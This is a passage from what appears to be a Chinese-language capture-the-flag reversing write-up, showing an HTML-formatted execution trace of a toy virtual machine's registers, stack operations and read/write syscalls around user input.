class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span><span class="hljs-comment">// [0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><span class="hljs-comment">// [0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x2 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<span class="hljs-comment">// [0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> s<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x90 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x4b<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x4b<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x4b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x91 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<span class="hljs-comment">// [0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x4b s:<span class="hljs-number">0</span>x4 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x92 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>x4 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x93 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<span class="hljs-comment">// [0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x94 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x59<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x59<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x59 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x95 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<span class="hljs-comment">// [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x59 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x96 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x3a<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x3a<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x3a s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x97 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<span class="hljs-comment">// [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x3a s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x98 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x99 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<span class="hljs-comment">// [0x20,0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x8 d<br><span class="hljs-selector-attr">[s]</span> ... write<br>KEY: <span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK c NONE<br><span class="hljs-selector-attr">[s]</span> ... popping c<span class="hljs-comment">// c = 0x20</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span><span class="hljs-comment">// b = 0x3a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span><span class="hljs-comment">// a = 0x59</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa0 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span><span class="hljs-comment">// [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><span class="hljs-comment">// [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<span class="hljs-comment">// [0x20,0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa3 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa4 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xe<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xe<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>xe d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa5 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>xe d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa6 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x4 d<br><span class="hljs-selector-attr">[s]</span> ... read_memory<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>上面的是接受用户输入前的代码，下面的是接收用户输入后的处理逻辑。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>xe d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa7 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK c NONE<br><span class="hljs-selector-attr">[s]</span> ... popping c<span class="hljs-comment">// c = 0x20 [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa8 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span><span class="hljs-comment">// b = 0x3a [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa9 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span><span class="hljs-comment">// a = 0x59 [0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xaa f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>xaa<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>xaa<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xab f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span><span class="hljs-comment">// [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x2 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xac f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> 